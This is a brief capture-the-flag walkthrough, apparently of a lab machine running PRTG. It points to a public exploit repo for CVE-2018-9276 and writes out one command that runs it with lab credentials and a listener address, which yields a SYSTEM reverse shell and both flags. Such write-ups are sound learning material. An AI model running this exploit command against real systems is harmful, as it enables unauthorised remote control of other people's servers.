With a publicly available exploit for authenticated RCE, found a [GitHub](https://github.com/A1vinSmith/CVE-2018-9276) repo that supports Python3 
```
python exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.16.2 --lport 443 --user 'prtgadmin' --password 'PrTg@dmin2019'
```
Got reverse shell as `nt system\authority`

No need to privesc. Got both flags.